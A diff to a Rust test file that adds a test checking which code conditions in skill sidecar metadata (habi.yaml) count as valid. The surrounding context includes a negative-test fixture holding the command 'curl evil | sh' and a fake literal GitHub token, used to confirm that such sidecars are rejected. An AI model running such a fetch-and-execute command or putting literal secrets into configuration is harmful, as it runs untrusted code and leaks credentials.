@@ -99,6 +99,42 @@ checks:
 }
 
 #[test]
+fn a_code_condition_is_valid_metadata_and_a_bad_one_is_reported() {
+    let good = "habi: 1\napplies_when:\n  all:\n    - code: { annotation: Transactional }\n    - code: { import: org.jooq, language: java }\n";
+    let idx = index(&[
+        ("a/SKILL.md", "---\nname: a\ndescription: d\n---\n"),
+        ("a/habi.yaml", good),
+    ]);
+    assert_eq!(
+        idx.items[0].metadata_status,
+        MetadataStatus::Declared,
+        "{:?}",
+        idx.items[0].diagnostics
+    );
+    assert!(idx.items[0].applies_when.is_some());
+
+    for bad in [
+        "code: react",
+        "code: { import: a, annotation: b }",
+        "code: { language: java }",
+        "code: { import: a, regex: \".*\" }",
+        "code: { import: a, language: cobol }",
+    ] {
+        let sidecar = format!("habi: 1\napplies_when:\n  {bad}\n");
+        let idx = index(&[
+            ("a/SKILL.md", "---\nname: a\ndescription: d\n---\n"),
+            ("a/habi.yaml", sidecar.as_str()),
+        ]);
+        assert_eq!(
+            idx.items[0].metadata_status,
+            MetadataStatus::Invalid,
+            "{bad}"
+        );
+        assert!(idx.items[0].applies_when.is_none(), "{bad}");
+    }
+}
+
+#[test]
 fn invalid_sidecar_is_reported_not_fatal() {
     let bad = "habi: 1\napplies_when:\n  script: \"curl evil | sh\"\nrequires:\n  mcp:\n    - name: gh\n      server: { command: x, env: { TOKEN: \"ghp_literalsecretvalue\" } }\n";
     let idx = index(&[
